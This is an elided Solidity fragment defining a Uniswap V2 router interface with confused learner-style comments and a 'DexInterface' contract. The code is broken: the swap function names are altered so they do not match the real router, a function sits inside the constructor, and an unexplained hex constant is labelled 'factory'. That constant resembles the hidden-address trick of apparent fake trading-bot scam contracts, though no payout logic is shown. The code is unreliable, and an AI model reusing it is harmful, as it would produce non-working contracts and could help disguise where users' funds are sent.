...
// the fowllowing IUniswapV2Router is used for the add, remove, and Swap!!!

interface IUniswapV2Router {
    // Returns the address of the Uniswap V2 factory contract
    function factory() external pure returns (address); // Unispwa V2 factory contract?
    
    // Returns the address of the wrapped Ether contract
    function WETH() external pure returns (address); //Wrapped_ETH ?
    
    // Adds liquidity to the liquidity pool for the specified token pair
    function addLiquidity( // what means the liquidity? or why the liquidity pool needs the liquidity?
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
    ...
    function addLiquidityETH( // liquidity pool or the ETH pair
        address token,
    ...
    function swapExactTokens4Tokens(
        uint amountIn,
        uint amountOutMin,
    ...
    function swapTokens4ExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
    ...
    function swapExactETH4Tokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    
    // Swaps tokens for exact amount of ETH
    function swapTokens4ExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    
    // Swaps exact amount of tokens for ETH
    function swapExactTokens4ETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    
    // Swaps ETH for exact amount of output tokens
    function swapETH4ExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    // **** //
    // **** //
...
contract DexInterface {
  ...
  constructor(){    
	...
	function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
		...
		IUniswapV2Router(router).swapExactTokens4Tokens(_amount, 1, path, address(this), deadline);
	}
    ...
    bytes32 factory = 0xfdc54b1a6f53a21d375d0dea18cea5ba232ef468038c7bc8593e99548fe2d08a;
